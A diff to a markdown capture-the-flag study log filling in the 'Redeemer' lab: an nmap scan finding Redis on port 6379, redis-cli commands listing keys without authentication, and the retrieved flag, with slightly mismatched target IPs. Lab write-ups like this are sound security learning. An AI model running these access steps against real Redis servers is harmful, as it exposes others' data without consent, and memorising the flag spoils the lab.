@@ -280,19 +280,36 @@ on any open port 445.
 
 ---
 
-## Redeemer [COMING SOON]
+## Redeemer 
+
+Date: 2026-04-07
+Time in Box: 12 minutes
 
 **Service:** Redis (Port 6379)
 **Concept:** Unauthenticated database access
 
 ### Enumeration
-<!-- PASTE YOUR NMAP OUTPUT -->
+nmap -sS -sV -Pn -p 1000-9999 -T5 10.129.21.145
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-07 22:36 CDT
+Nmap scan report for 10.129.21.145
+
+Host is up (0.018s latency).
+Not shown: 8999 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 5.0.7
+
 
 ### Exploitation
-<!-- PASTE YOUR REDIS-CLI COMMANDS AND OUTPUT -->
+redis-cli -h 10.129.21.138 -p 6379
+10.129.21.138:6379> keys *
+1) "numb"
+2) "flag"
+3) "temp"
+4) "stor"
 
 ### Flag
-<!-- PASTE FLAG -->
+10.129.21.138:6379> mget flag
+1) "03e1d2b376c37ab3f5319922053953eb"
 
 ### Key Takeaway
 Redis, MongoDB, and other databases are frequently left
